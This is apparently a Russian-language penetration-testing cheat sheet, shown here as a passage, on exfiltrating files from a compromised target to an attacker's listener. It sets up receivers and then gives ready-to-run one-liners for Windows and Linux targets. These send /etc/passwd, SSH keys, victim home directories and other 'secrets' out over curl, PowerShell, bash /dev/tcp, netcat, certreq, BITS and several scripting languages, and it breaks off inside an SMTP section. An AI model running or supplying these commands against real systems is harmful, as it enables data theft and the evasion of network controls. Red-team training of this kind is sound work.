# 02 - Target → Attacker (эксфильтрация)

> [← README](../../README_RU.md) · [Следующий раздел →](03-smb.md)

Вытаскиваем файлы **с цели (RHOST) на атакующего (LHOST)**. На атакующем поднимаем приёмник (upload-сервер / листенер), с цели - отправляем.

> **Вынесено в другие файлы:** SMB - [03-smb.md](03-smb.md), WebDAV - [04-webdav.md](04-webdav.md), Netcat - [07-netcat.md](07-netcat.md), DNS/ICMP - [12-dns-icmp.md](12-dns-icmp.md), кодирование/шифрование - [10](10-encoding.md)/[11](11-encryption.md).

> **SSH-учётки:** `LHOST_user` / `RHOST_user` — логины для SSH на LHOST/RHOST. Задайте их перед примерами с реверс-туннелями: `export LHOST_user=user RHOST_user=user` (см. [переменные в README](../../README_RU.md#обозначения-и-переменные)).

**Быстрый переход по ОС:** [Attacker - приёмник](#1attacker---поднять-приёмник) · [Windows target - отправка](#2windows-target---отправка-всё-на-rhost) · [Linux target - отправка](#3linux-target---отправка-всё-на-rhost).

---

## Навигация

|  |  |
|---|---|
| [1.💻Attacker - поднять приёмник](#1attacker---поднять-приёмник) | [2.🪟Windows target - отправка (всё на RHOST)](#2windows-target---отправка-всё-на-rhost) |
| [3.🐧Linux target - отправка (всё на RHOST)](#3linux-target---отправка-всё-на-rhost) | [4. SMTP / e-mail](#4-smtp--e-mail---эксфил-почтой) |
| [5. Реверс-туннели](#5-реверс-туннели-цель-стучится-наружу) | [6. TLS и UDP](#6-tls-и-udp---сырые-каналы) |
| [7. Blind / OOB-эксфил](#7-blind--oob-эксфил-проверка-дошло--крохи-данных) | [Как это работает](#как-это-работает) |
| [Какой приёмник выбрать](#какой-приёмник-выбрать-чтобы-не-путаться) | [Проверка целостности](#проверка-целостности-обязательно) |
| [Формы переменных](#формы-переменных) |  |

---

## Как это работает

```
RHOST (цель)                         LHOST (атакующий)
  curl -F files=@secret  ────────▶   uploadserver :8000   → /tmp/share/secret
  cat loot > /dev/tcp/... ───────▶   nc -lvnp 4444        → secrets.zip
  certreq -Post ...      ────────▶   serv.py (raw POST)   → received.bin
```

Ключевой момент: **разные приёмники ждут разный формат запроса**. Если не совпало - получаем `400 Bad Request`, `405` или пустой файл. Ниже таблица «что с чем работает», а дальше - каждый приёмник отдельно.

---

## Какой приёмник выбрать (чтобы не путаться)

| Приёмник | Протокол / формат | Когда брать | Что принимает |
|----------|-------------------|-------------|---------------|
| **uploadserver** | HTTP multipart, поле **`files`** | по умолчанию, самый удобный (есть веб-страница) | `curl -F`, PowerShell `-Form` (PS 7+), браузер |
| **serv.py** | HTTP multipart (любое имя поля) + raw POST/PUT | когда поле не `files` или шлём сырое тело (`certreq`, `--data-binary`) | почти всё |
| **uploadserver + TLS** | HTTPS multipart | HTTP режется / нужен шифрованный канал | то же, что uploadserver |
| **nginx PUT** | HTTP `PUT` | нужен именно PUT, устойчивый приёмник | `curl -T`, `WebClient.UploadFile("PUT")` |
| **updog** | HTTP/HTTPS upload+download | быстрый современный сервер с паролем и TLS | браузер, `curl` |
| **netcat / socat** | raw TCP | нет HTTP вообще | `/dev/tcp`, `ncat`, `TcpClient` |
| **certreq** | HTTP POST (LOLBin) | обход, когда всё режется | `serv.py` (raw) |
| **bitsadmin / Start-BitsTransfer** | протокол BITS upload | цель разрешает только BITS | BITS-совместимый сервер (IIS BITS/BITSServer); не `serv.py`/nginx |
| **SMTP (e-mail)** | SMTP (25/587) | цель может слать почту наружу | `swaks`, `Send-MailMessage`, `smtplib` |
| **Реверс-туннель** | HTTP/SSH/TLS | цель сама стучится наружу, файлы тянем через туннель | `chisel`, `ligolo-ng`, `ssh -R`, `cloudflared` |
| **TLS / UDP raw** | TLS:443 / UDP | TCP:443 или UDP открыт, HTTP не нужен | `socat`, `ncat --ssl`, `openssl` |
| **OOB-сервис** | DNS/HTTP | blind: нужен факт «дошло» или крохи данных | `interactsh`, Collaborator |

> **Важно:** `uploadserver` **жёстко требует** multipart и имя поля `files`. Поэтому `certreq`, `curl --data-binary`, `Invoke-RestMethod -InFile` с ним часто падают: `-InFile` шлёт сырое тело. Для `uploadserver` используйте `-Form` (PS 7+) или ручную сборку multipart ниже; для raw-отправителей - `serv.py` (raw-ветка) или nginx. BITS - отдельная история: `bitsadmin`/`Start-BitsTransfer` требуют BITS-совместимый сервер и не работают с `serv.py`/nginx.

---

## 1.💻Attacker - поднять приёмник

Поднимаем приёмник на **LHOST** (наш ПК). Ниже - все варианты; чем шлём с цели - см. разделы 2 (Windows) и 3 (Linux).

Сырое тело (raw body) - это когда содержимое файла отправляется как есть, одним сплошным потоком байт, без какой-либо обёртки, и сервер должен сам догадаться, что это за файл и как он называется (обычно по имени в URL, например ?file=secrets.txt).

Multipart/form-data - это когда файл упаковывается в структурированный контейнер с разделителями (boundary), внутри которого для каждого файла указаны его имя поля, оригинальное имя и тип содержимого, и сервер точно знает, что это за файл и куда его положить.

Коротко: raw - просто «вот байты, разбирайся сам», multipart - «вот файл, вот его имя, вот его тип, вот поле, в которое его положить».

### uploadserver (HTTP)

Лёгкий Python-сервер: есть веб-страница загрузки, принимает несколько файлов сразу, при коллизии имён переименовывает. Требует **Python 3.9+**.

**Установка через pipx:**
```bash
pipx install uploadserver
```

**Установка через pip:**
```bash
python3 -m pip install --user uploadserver
```

**Создать каталог для загрузок:**
```bash
mkdir -p /tmp/share
```

**Запустить сервер на порту 8000:**
```bash
cd /tmp/share && uploadserver 8000
```

Веб-страница загрузки: `http://<LHOST>:8000/upload`. Файлы падают в `/tmp/share/`.

Полезные опции: `-d <dir>` (каталог), `-b <addr>` (интерфейс), `--allow-replace` (перезаписывать, а не переименовывать), `--basic-auth user:pass` (пароль на всё), `--basic-auth-upload user:pass` (пароль только на загрузку).

### serv.py

Нужен, когда `uploadserver` не подходит: **другое имя поля** или **сырое тело** (`certreq`, `curl --data-binary`). Принимает multipart, raw POST/PUT и сохраняет в выбранный каталог (по умолчанию текущий).

> Важно: код **не использует модуль `cgi`** - он удалён в Python 3.13. Разбор multipart идёт через `email`.

**Создать каталог:**
```bash
mkdir -p /tmp/share && cd /tmp/share
```

**Приёмник:**
> Полный исходник: [scripts/upload/serv.py](../../scripts/upload/serv.py)

Скопировать `scripts/upload/serv.py` на LHOST и запустить:

```bash
python3 serv.py                         # по умолчанию: 0.0.0.0:8000, текущий каталог
python3 serv.py -p 9001 -d /tmp/share   # свой порт и каталог для loot
```

Полезные опции: `-p/--port` (по умолчанию `8000`), `-b/--bind`, `-d/--directory`, `--max-size` (`512M`, `2G`, `0` = без лимита; по умолчанию `1G`), `--token` (в `X-Upload-Token` или `?token=`), `--tls-cert`/`--tls-key`, `-q/--quiet`. Принимает `POST`/`PUT`, multipart с любым именем поля и raw-тело; `GET /health` возвращает готовность. В ответе и stdout печатается SHA-256 каждого сохранённого файла. Для raw `PUT` используйте путь вида `/drop/file.bin` или `?file=file.bin`; для `/` имя будет с таймстампом.

### uploadserver (HTTPS)

Тот же `uploadserver`, но по TLS - когда HTTP режется или нужен шифрованный канал.

**Сгенерировать самоподписанный сертификат:**
```bash
openssl req -x509 -out /tmp/server.pem -keyout /tmp/server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```
**Запустить сервер на 443 (каталог загрузок не должен содержать серт)**
```bash
cd /tmp/share && uploadserver 443 --server-certificate /tmp/server.pem
```
Errors?

**Узнать полный путь до uploadserver (pipx trouble)**
```
which uploadserver
```

**Запустить сервер на 443 (каталог загрузок не должен содержать серт):**
```bash
cd /tmp/share && /home/kali/.local/bin/uploadserver 443 --server-certificate /tmp/server.pem
```

Веб-страница: `https://<LHOST>/upload`.

### nginx (PUT)

Когда нужен именно `PUT` или `uploadserver` недоступен. nginx складывает файл по указанному в URL пути.

**Установить nginx:**
```bash
sudo apt install -y nginx
```

**Создать каталог для загрузок:**
```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

**Выдать права www-data:**
```bash
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

**Записать конфиг `upload.conf`:**
```bash
sudo tee /etc/nginx/sites-available/upload.conf >/dev/null <<'CONF'
server {
    listen 9001;
    client_max_body_size 0;              # без лимита на размер загрузки

    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
        create_full_put_path on;
    }
}
CONF
```

**Включить конфиг и перезапустить nginx:**
```bash
sudo ln -sf /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/upload.conf
sudo rm -f /etc/nginx/sites-enabled/default
sudo systemctl restart nginx
```

**Проверить ошибки:**
```bash
tail -2 /var/log/nginx/error.log
```

Проверка: `http://$LHOST:9001/SecretUploadDirectory/` в браузере → `403 Forbidden` (это нормально). Файлы падают в `/var/www/uploads/SecretUploadDirectory/`.

### updog

Замена `python -m http.server`: качает и принимает файлы, умеет пароль и TLS. Требует **Python 3.11+**.

**Установка:**
```bash
pipx install updog
```

**Запуск (HTTP, каталог и порт):**
```bash
updog -d /tmp/share -p 8000
```

**Запуск с TLS (ad-hoc сертификат):**
```bash
updog -d /tmp/share -p 8443 --ssl
```

**Запуск с паролем (basic-auth, логин пустой):**
```bash
updog -d /tmp/share -p 8000 --password 'S3cret'
```

### raw TCP (nc / socat)

Когда HTTP нет вообще, но есть хоть один открытый порт наружу.

**netcat:**
```bash
nc -lvnp 4444 > secrets.zip
```

**socat (дописывает в файл, переживает переподключения):**
```bash
socat -u TCP-LISTEN:4444,reuseaddr,fork OPEN:secrets.zip,creat,append
```

---

## 2.🪟Windows target - отправка (всё на RHOST)

Все команды выполняем **на Windows-цели**. Приёмник уже поднят - см. [раздел 1](#1attacker---поднять-приёмник).

> Готовый тестер: [`scripts/Windows-Exfil-tester.ps1`](../../scripts/Windows-Exfil-tester.ps1) - по умолчанию останавливается на первом рабочем способе; `-All` прогоняет полную матрицу и пишет лог; `-NoLogs` печатает только `Done!`; `-FILE C:\Users\Public\secrets.zip` задаёт отправляемый файл; `-Receiver uploadserver|servpy|nginx|bits|rawtcp|smb` ограничивает `-All` запущенным приёмником; `-UNCPath`/`-RawPort` включают SMB и raw-TCP. Приёмник на Kali запускайте в каталоге, куда должен лечь loot.

> **Переменные:** `${LHOST}` - это IP атакующего. Форма со скобками работает и перед `/`, и перед `:port`. Под каждой PowerShell-командой есть вариант с литеральным IP в комментарии; `192.168.2.5` - пример LHOST, замените на свой.

### uploadserver (HTTP)

`uploadserver` требует **multipart/form-data** с именем поля `files`.

**curl.exe - один файл:**
```cmd
curl.exe -X POST http://%LHOST%:8000/upload -F "files=@C:\Users\Public\secrets.txt"
```

**curl.exe - несколько файлов:**
```cmd
curl.exe -X POST -F "files=@C:\Users\Public\a.txt" -F "files=@C:\Users\Public\b.txt" http://%LHOST%:8000/upload
```

**PowerShell 7+ - один файл (`-Form` собирает multipart):**
```powershell
Invoke-RestMethod -Uri "http://${LHOST}:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" }
# literal IP:
# Invoke-RestMethod -Uri "http://192.168.2.5:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" }
```

**PowerShell 7+ - несколько файлов (по одному запросу на файл):**
```powershell
foreach ($f in "C:\Users\Public\a.txt","C:\Users\Public\b.txt") {
  Invoke-RestMethod -Uri "http://${LHOST}:8000/upload" -Method Post -Form @{ files = Get-Item $f }
}
# literal IP:
# foreach ($f in "C:\Users\Public\a.txt","C:\Users\Public\b.txt") {
#   Invoke-RestMethod -Uri "http://192.168.2.5:8000/upload" -Method Post -Form @{ files = Get-Item $f }
# }
```

**PowerShell 5.1 - multipart вручную (один файл):**
```powershell
# literal IP: замените ${LHOST} на 192.168.2.5
$b=[Guid]::NewGuid().ToString();$f=[IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip");$h=[Text.Encoding]::UTF8.GetBytes("--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"secrets.zip`"`r`nContent-Type: application/zip`r`n`r`n");$t=[Text.Encoding]::UTF8.GetBytes("`r`n--$b--`r`n");$m=New-Object IO.MemoryStream;$m.Write($h,0,$h.Length);$m.Write($f,0,$f.Length);$m.Write($t,0,$t.Length);Invoke-RestMethod -Uri "http://${LHOST}:8000/upload" -Method Post -ContentType "multipart/form-data; boundary=$b" -Body $m.ToArray()
```

**PowerShell 5.1 - multipart вручную (несколько файлов):**
```powershell
# literal IP: замените ${LHOST} на 192.168.2.5
$url="http://${LHOST}:8000/upload";$paths=@("C:\Users\Public\a.txt","C:\Users\Public\b.txt");$b=[Guid]::NewGuid().ToString();$m=New-Object IO.MemoryStream;foreach($p in $paths){$f=[IO.File]::ReadAllBytes($p);$n=[IO.Path]::GetFileName($p);$h=[Text.Encoding]::UTF8.GetBytes("--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"$n`"`r`nContent-Type: application/octet-stream`r`n`r`n");$m.Write($h,0,$h.Length);$m.Write($f,0,$f.Length);$m.Write([Text.Encoding]::UTF8.GetBytes("`r`n"),0,2)};$t=[Text.Encoding]::UTF8.GetBytes("--$b--`r`n");$m.Write($t,0,$t.Length);Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$b" -Body $m.ToArray()
```

> **`-InFile` - это не multipart.** `Invoke-RestMethod -InFile` отправляет сырое тело и не заполняет поле `files`, поэтому против `uploadserver` он падает. Используйте `-Form` (PowerShell 7+) или ручную сборку выше. `-InFile` корректен для raw-режима `serv.py` и для nginx PUT.

**PowerShell 7+ - HTTPS с multipart:**
```powershell
Invoke-RestMethod -Uri "https://${LHOST}:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" } -SkipCertificateCheck
# literal IP:
# Invoke-RestMethod -Uri "https://192.168.2.5:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" } -SkipCertificateCheck
```

### serv.py

`serv.py` принимает multipart с любым именем поля или сырое тело. Для сырого тела имя файла берётся из `?file=` или `Content-Disposition`.

**cmd curl.exe - сырое тело + `?file=`:**
```cmd
curl.exe -X POST --data-binary "@C:\Users\Public\secrets.txt" "http://%LHOST%:8000/upload?file=secrets.txt"
```

**PowerShell - сырое тело байтами:**
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt")
Invoke-WebRequest -Uri "http://${LHOST}:8000/upload?file=secrets.txt" -Method POST -Body $bytes -ContentType "application/octet-stream"
# literal IP:
# $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt")
# Invoke-WebRequest -Uri "http://192.168.2.5:8000/upload?file=secrets.txt" -Method POST -Body $bytes -ContentType "application/octet-stream"
```

**PowerShell - `-InFile` сырым телом (корректное применение `-InFile`):**
```powershell
Invoke-RestMethod -Uri "http://${LHOST}:8000/upload?file=secrets.txt" -Method Post -InFile "C:\Users\Public\secrets.txt"
# literal IP:
# Invoke-RestMethod -Uri "http://192.168.2.5:8000/upload?file=secrets.txt" -Method Post -InFile "C:\Users\Public\secrets.txt"
```

**PowerShell 7+ - HTTPS сырым телом:**
```powershell
Invoke-RestMethod -Uri "https://${LHOST}:8000/upload?file=secrets.txt" -Method Post -InFile "C:\Users\Public\secrets.txt" -SkipCertificateCheck
# literal IP:
# Invoke-RestMethod -Uri "https://192.168.2.5:8000/upload?file=secrets.txt" -Method Post -InFile "C:\Users\Public\secrets.txt" -SkipCertificateCheck
```

**PowerShell 5.1 - multipart вручную (несколько файлов):**
```powershell
# literal IP: замените ${LHOST} на 192.168.2.5
$b=[Guid]::NewGuid().ToString();$e=[Text.Encoding]::GetEncoding("iso-8859-1");$d="";foreach($p in "C:\Users\Public\a.txt","C:\Users\Public\b.txt"){$n=[IO.Path]::GetFileName($p);$d+="--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"$n`"`r`nContent-Type: application/octet-stream`r`n`r`n"+$e.GetString([IO.File]::ReadAllBytes($p))+"`r`n"};$d+="--$b--`r`n";Invoke-WebRequest -Uri "http://${LHOST}:8000/upload" -Method Post -Body $e.GetBytes($d) -ContentType "multipart/form-data; boundary=$b"
```

### uploadserver (HTTPS)

**curl.exe с `-k`:**
```cmd
curl.exe -k -X POST https://%LHOST%/upload -F "files=@C:\Users\Public\secrets.txt"
```

**PowerShell 7+ - multipart через `-Form`:**
```powershell
Invoke-RestMethod -Uri "https://${LHOST}/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" } -SkipCertificateCheck
# literal IP:
# Invoke-RestMethod -Uri "https://192.168.2.5/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" } -SkipCertificateCheck
```

**Старый PowerShell - обойти проверку серта в текущей сессии:**
```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
```

**Старый PowerShell - multipart вручную:**
```powershell
# literal IP: замените ${LHOST} на 192.168.2.5
[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$b=[Guid]::NewGuid().ToString();$e=[Text.Encoding]::GetEncoding("iso-8859-1");$d="--$b`r`nContent-Disposition: form-data; name=`"files`"; filename=`"secrets.txt`"`r`nContent-Type: application/octet-stream`r`n`r`n"+$e.GetString([IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt"))+"`r`n--$b--`r`n";Invoke-WebRequest -Uri "https://${LHOST}/upload" -Method Post -Body $e.GetBytes($d) -ContentType "multipart/form-data; boundary=$b"
```

### nginx (PUT)

**PowerShell - PUT через `-InFile` (тело сырое, поэтому `-InFile` здесь корректен):**
```powershell
Invoke-RestMethod -Uri "http://${LHOST}:9001/SecretUploadDirectory/secrets.zip" -Method Put -InFile "C:\Users\Public\secrets.zip"
# literal IP:
# Invoke-RestMethod -Uri "http://192.168.2.5:9001/SecretUploadDirectory/secrets.zip" -Method Put -InFile "C:\Users\Public\secrets.zip"
```

**PowerShell - WebClient PUT:**
```powershell
(New-Object Net.WebClient).UploadFile("http://${LHOST}:9001/SecretUploadDirectory/secrets.zip","PUT","C:\Users\Public\secrets.zip")
# literal IP:
# (New-Object Net.WebClient).UploadFile("http://192.168.2.5:9001/SecretUploadDirectory/secrets.zip","PUT","C:\Users\Public\secrets.zip")
```

**curl.exe -T (PUT):**
```cmd
curl.exe -T C:\Users\Public\secrets.zip http://%LHOST%:9001/SecretUploadDirectory/secrets.zip
```

### updog

**curl.exe:**
```cmd
curl.exe -X POST -F "file=@C:\Users\Public\secrets.zip" -F "path=." http://%LHOST%:8000/upload
```

https:
```cmd
curl.exe -X POST -F "file=@C:\Users\Public\secrets.zip" -F "path=." https://%LHOST%:8000/upload --insecure
```

### raw TCP (nc / socat)

**ncat.exe (из пакета nmap):**
```cmd
ncat.exe %LHOST% 4444 < C:\Users\Public\secrets.zip
```

**Чистый PowerShell, без внешних утилит:**
```powershell
$c = New-Object Net.Sockets.TcpClient("${LHOST}", 4444)
$s = $c.GetStream()
$b = [IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip")
$s.Write($b, 0, $b.Length); $s.Flush(); $s.Close(); $c.Close()
# literal IP:
# $c = New-Object Net.Sockets.TcpClient("192.168.2.5", 4444); $s=$c.GetStream(); $b=[IO.File]::ReadAllBytes("C:\Users\Public\secrets.zip"); $s.Write($b,0,$b.Length); $s.Flush(); $s.Close(); $c.Close()
```

Или, без переменной:
```powershell
$c=New-Object Net.Sockets.TcpClient("192.168.2.5",4444); $f=[IO.File]::OpenRead("C:\Users\Public\secrets.zip"); $f.CopyTo($c.GetStream()); $c.Close(); $f.Close()
```



### Windows LOLBins (обход)

Когда «обычные» способы зарезаны, но системные бинари не тронуты. Помним: они шлют **не multipart** - принимай их `serv.py` (raw-ветка) или `nc`.


**certutil encode -> curl send -> decode на атакующем:**
```cmd
certutil -encode C:\Users\Public\secrets.zip C:\Users\Public\s.txt
curl.exe -X POST --data-binary "@C:\Users\Public\s.txt" "http://%LHOST%:8000/upload?file=s.txt"
```
На Linux срезаем PEM-обёртку перед декодированием:
```bash
tr -d '\r' < s.txt | sed '/^-----/d' | base64 -d > secrets.zip
```
> `base64 -d s.txt` падает, потому что `certutil -encode` добавляет `-----BEGIN CERTIFICATE-----` и `-----END CERTIFICATE-----`. Либо срежьте эти строки, как показано, либо используйте `certutil -decode` на Windows.


#### certreq - HTTP POST системным бинарём

**LHOST - приёмник raw-POST (`serv.py`):**
```bash
python3 serv.py
```

**LHOST - либо просто логирующий nc:**
```bash
nc -lvnp 80 > received.txt
```

**RHOST (CMD) - certreq шлёт содержимое файла телом POST:**
```cmd
certreq.exe -Post -config http://%LHOST%:80/ C:\Users\Public\flag.txt
```

#### bitsadmin / Start-BitsTransfer - загрузка через BITS
Может не работать.
**LHOST - нужен BITS-совместимый сервер (IIS BITS/BITSServer):**

Обычные HTTP-приёмники (`serv.py`, uploadserver, nginx) не реализуют BITS upload и отклонят такой запрос; для этих команд нужен BITS-сервер.

**RHOST (CMD) - BITS-задача на загрузку (upload):**
```cmd
bitsadmin /transfer myjob /upload http://%LHOST%:8000/upload C:\Users\Public\secrets.zip
```

**RHOST (PowerShell) - то же через модуль BitsTransfer:**
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -TransferType Upload -Source "C:\Users\Public\secrets.zip" -Destination "http://${LHOST}:8000/upload"
# literal IP:
# Start-BitsTransfer -TransferType Upload -Source "C:\Users\Public\secrets.zip" -Destination "http://192.168.2.5:8000/upload"
```

> BITS капризен к серверу (шлёт свои заголовки и `Content-Range`). `serv.py` и nginx PUT не являются BITS-серверами и такой upload не примут. Нужен BITS-совместимый сервер или другой способ.

#### PowerShell - быстрые способы

**multipart с именем файла (`uploadserver`; PS 7+):**
```powershell
Invoke-RestMethod -Uri "http://${LHOST}:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" }
# literal IP:
# Invoke-RestMethod -Uri "http://192.168.2.5:8000/upload" -Method Post -Form @{ files = Get-Item "C:\Users\Public\secrets.txt" }
```

**Сырое тело байтами (`serv.py` raw-ветка):**
```powershell
$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt")
Invoke-WebRequest -Uri "http://${LHOST}:8000/upload?file=secrets.txt" -Method POST -Body $bytes -ContentType "application/octet-stream"
# literal IP:
# $bytes = [System.IO.File]::ReadAllBytes("C:\Users\Public\secrets.txt"); Invoke-WebRequest -Uri "http://192.168.2.5:8000/upload?file=secrets.txt" -Method POST -Body $bytes -ContentType "application/octet-stream"
```

**WebClient.UploadFile с произвольным методом (PUT/POST):**
```powershell
(New-Object Net.WebClient).UploadFile("http://${LHOST}:9001/SecretUploadDirectory/x.zip", "PUT", "C:\Users\Public\secrets.zip")
# literal IP:
# (New-Object Net.WebClient).UploadFile("http://192.168.2.5:9001/SecretUploadDirectory/x.zip", "PUT", "C:\Users\Public\secrets.zip")
```

---

## 3.🐧Linux target - отправка (всё на RHOST)

Все команды выполняем **на Linux-цели**. Приёмник уже поднят - см. [раздел 1](#1attacker---поднять-приёмник).

### uploadserver (HTTP)

**Один файл (поле обязательно `files`):**
```bash
curl -X POST http://$LHOST:8000/upload -F 'files=@/etc/passwd'
```

**Несколько файлов за раз:**
```bash
curl -X POST http://$LHOST:8000/upload -F 'files=@/etc/hostname' -F 'files=@/etc/hosts'
```

**Рекурсивно отправить каталог:**
```bash
find /tmp/victim-secrets -type f | while read f; do
  curl -s -X POST http://$LHOST:8000/upload -F "files=@$f" && echo "[+] $f"
done
```

**Стримом без промежуточного файла (tar → upload):**
```bash
tar czf - /etc/ssh | curl -s -X POST http://$LHOST:8000/upload -F 'files=@-;filename=secrets.tar.gz'
```

**Через python3 + requests (если нет curl):**
```bash
python3 -c 'import requests;requests.post("http://'"$LHOST"':8000/upload",files={"files":open("/etc/passwd","rb")})'
```

### serv.py

**multipart с произвольным именем поля:**
```bash
curl -X POST http://$LHOST:8000/upload -F 'anything=@/etc/passwd'
```

**Сырое тело + имя в query (`?file=`):**
```bash
curl -X POST --data-binary @/etc/passwd "http://$LHOST:8000/upload?file=passwd"
```

**Сырое тело + имя в заголовке `Content-Disposition`:**
```bash
curl -X POST -H 'Content-Disposition: attachment; filename="passwd"' --data-binary @/etc/passwd http://$LHOST:8000/upload
```
**WGET UPLOAD**
```bash
wget --post-file="/etc/passwd" http://$LHOST:8000/upload
```

### uploadserver (HTTPS)

**Один файл (`-k` = не проверять самоподписанный серт):**
```bash
curl -k -X POST https://$LHOST/upload -F 'files=@/etc/passwd'
```

**Несколько файлов:**
```bash
curl -k -X POST https://$LHOST/upload -F 'files=@/etc/hostname' -F 'files=@/etc/hosts'
```

**Рекурсивно:**
```bash
find /tmp/victim-secrets -type f | while read f; do
  curl -ks -X POST https://$LHOST/upload -F "files=@$f" && echo "[+] $f"
done
```

**Через python3 + requests (`verify=False`):**
```bash
python3 -c 'import requests;requests.post("https://'"$LHOST"'/upload",files={"files":open("/etc/passwd","rb")},verify=False)'
```

### nginx (PUT)

**curl -T (PUT), имя файла задаём в конце URL:**
```bash
curl -T /etc/passwd http://$LHOST:9001/SecretUploadDirectory/passwd.txt
```

**Рекурсивно:**
```bash
find /tmp/victim-secrets -type f | while read f; do
  curl -s -T "$f" "http://$LHOST:9001/SecretUploadDirectory/$(basename "$f")" && echo "[+] $f"
done
```

**wget - PUT с телом из файла (если нет curl):**
```bash
wget --method=PUT --body-file=/etc/passwd http://$LHOST:9001/SecretUploadDirectory/passwd.txt
```

### updog

**multipart:**
```bash
curl -X POST -F "file=@/etc/passwd" -F "path=/tmp/share" http://$LHOST:8000/upload
```

**С паролем:**
```bash
curl -u ":S3cret" -X POST -F "file=@/etc/passwd" -F "path=/tmp/share" http://$LHOST:8000/upload
```


### raw TCP (nc / socat)

**Только bash, без утилит:**
```bash
cat secrets.zip > /dev/tcp/$LHOST/4444
```

**socat:**
```bash
socat -u FILE:secrets.zip TCP:$LHOST:4444
```

### Linux-приёмы (когда нет curl/wget)

#### bash /dev/tcp - ничего, кроме bash

**LHOST - слушаем:**
```bash
nc -lvnp 9001 > secrets.tar.gz
```

**RHOST - выталкиваем файл в сокет:**
```bash
cat /home/victim/secrets.tar.gz > /dev/tcp/$LHOST/9001
```

**RHOST - без cat, чисто редиректом:**
```bash
exec 3>/dev/tcp/$LHOST/9001; cat secrets.tar.gz >&3; exec 3>&-
```

> Это фича именно **bash** (и ksh). В `sh`/`dash` её нет - проверяем `ls -la /bin/sh`, при необходимости запускаем `bash -c '...'`.

#### python3 - requests или stdlib

**requests (multipart, поле `files` - под uploadserver):**
```bash
python3 -c 'import requests;requests.post("http://'"$LHOST"':8000/upload",files={"files":open("/etc/passwd","rb")})'
```

**Только stdlib: сырой POST байтами (`serv.py` raw-ветка):**
```bash
python3 -c 'import urllib.request; d=open("/etc/passwd","rb").read(); urllib.request.urlopen(urllib.request.Request("http://'"$LHOST"':8000/upload?file=passwd", data=d, method="POST"))'
```

#### tar-стриминг (каталог без промежуточного файла)

**tar → PUT (nginx):**
```bash
tar czf - /home/victim | curl -s -T - http://$LHOST:9001/SecretUploadDirectory/home.tar.gz
```

**tar → raw TCP:**
```bash
tar czf - /home/victim | nc $LHOST 4444
```

#### Однострочники на других языках (когда есть только интерпретатор)

**PHP - сырой POST на `serv.py`:**
```bash
php -r '$d=file_get_contents("/etc/passwd"); file_get_contents("http://'"$LHOST"':8000/upload?file=passwd", false, stream_context_create(["http"=>["method"=>"POST","header"=>"Content-Type: application/octet-stream","content"=>$d]]));'
```

**Perl (HTTP::Tiny) - сырой POST:**
```bash
perl -MHTTP::Tiny -e 'open F,"<","/etc/passwd"; local $/; $d=<F>; HTTP::Tiny->new->post("http://'"$LHOST"':8000/upload?file=passwd",{content=>$d})'
```

**Ruby - сырой TCP в листенер:**
LHOST:
```
nc -l -p 4444 > /tmp/passwd_received
```
RHOST:
```bash
ruby -rsocket -e 's=TCPSocket.new("'"$LHOST"'",4444); s.write(File.binread("/etc/passwd")); s.close'
```

**Node.js - сырой POST:**
```bash
node -e 'const f=require("fs"),h=require("http"),d=f.readFileSync("/etc/passwd");const r=h.request({host:"'"$LHOST"'",port:8000,path:"/upload?file=passwd",method:"POST"},()=>{});r.end(d)'
```

---

## 4. SMTP / e-mail - эксфил почтой

Нужен SMTP-сервер (свой или публичный) и ящик для приёма.

**Порты и режимы:**

| Порт | Режим | Когда использовать |
|------|-------|--------------------|
| **25** | SMTP (plain), опционально STARTTLS | внутренняя релейка; наружу часто заблокирован |
| **587** | submission + **STARTTLS** | стандарт отправки с клиента; TLS по апгрейду после `EHLO` |
| **465** | **SMTPS** (implicit TLS) | TLS с первого байта; берём, если 587 режут |

> Для 587/465 нужен сертификат. На приёме ставим **самоподписанный**, а на отправке проверку серта **отключаем** - иначе `certificate verify failed`.

### Attacker - приём

**Реальный ящик (проще всего):** заводим почту (Gmail и т.п.) и смотрим вложения.

**Самоподписанный сертификат (для 587/465):**
```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 365 \
  -keyout smtp-key.pem -out smtp-cert.pem \
  -subj "/CN=$LHOST" -addext "subjectAltName=IP:$LHOST"
```

**Перехватчик - plain (25):**
```bash
pipx install aiosmtpd
aiosmtpd -n -l 0.0.0.0:25
```

Decode pipeline
```bash
aiosmtpd -n -l 0.0.0.0:25 | tee mail.log
```
Когда получили письмо с base64 нажимаем(CTRL+C)
Затем
```
sed -n '/MESSAGE FOLLOWS/,/END MESSAGE/p' mail.log | sed '1d;$d' | sed '/^X-Peer:/d' | awk 'f{print} /Content-Disposition: attachment/{f=1}' | sed '1d' | tr -d '\r\n ' | base64 -d > secrets.zip
```
Убирается весь мусор, декодируется base64, сохраняется финальный файл.

**Перехватчик - STARTTLS (587):**
```bash
aiosmtpd -n -l 0.0.0.0:587 --tlscert smtp-cert.pem --tlskey smtp-key.pem
```

**Перехватчик - SMTPS (465, implicit TLS):**
```bash
